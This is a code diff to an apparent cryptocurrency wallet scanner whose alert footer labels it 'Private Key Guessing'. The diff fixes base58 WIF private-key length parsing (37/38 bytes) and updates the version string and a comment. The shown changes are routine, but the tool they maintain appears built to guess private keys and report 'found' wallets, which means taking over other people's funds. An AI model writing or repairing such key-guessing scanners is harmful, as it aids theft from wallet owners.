@@ -216,7 +216,7 @@ class AlertManager:
                 {"name": "🆔 Wallet ID", "value": str(wallet_id), "inline": True},
                 {"name": "🕐 Found At", "value": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True}
             ],
-            "footer": {"text": f"Scanner v6.0 (Private Key Guessing) | {BLOCKCHAIN.upper()}"},
+            "footer": {"text": f"Scanner v6.1 (Fixed WIF length) | {BLOCKCHAIN.upper()}"},
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
         async with aiohttp.ClientSession() as session:
@@ -337,7 +337,7 @@ class WalletScanner:
         else:
             return private_key_to_wif(raw, compressed=True)
 
-    # ---------- Derive addresses from private key ----------
+    # ---------- Derive addresses from private key (FIXED) ----------
     def _derive_addresses_from_key_sync(self, private_key: str) -> List[str]:
         addresses = []
         if self.is_evm:
@@ -353,10 +353,12 @@ class WalletScanner:
         else:
             try:
                 decoded = base58.b58decode(private_key)
-                if len(decoded) == 34:  # compressed WIF
-                    private_key_bytes = decoded[1:33]
-                elif len(decoded) == 33:  # uncompressed WIF
-                    private_key_bytes = decoded[1:33]
+                # Compressed WIF: 1 byte version + 32 bytes private + 1 byte compression flag + 4 bytes checksum = 38
+                # Uncompressed WIF: 1 byte version + 32 bytes private + 4 bytes checksum = 37
+                if len(decoded) == 38:  # compressed
+                    private_key_bytes = decoded[1:33]  # skip version, take 32 bytes
+                elif len(decoded) == 37:  # uncompressed
+                    private_key_bytes = decoded[1:33]  # skip version, take 32 bytes
                 else:
                     logger.error(f"Invalid WIF length: {len(decoded)}")
                     return []
@@ -707,4 +709,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-EOF
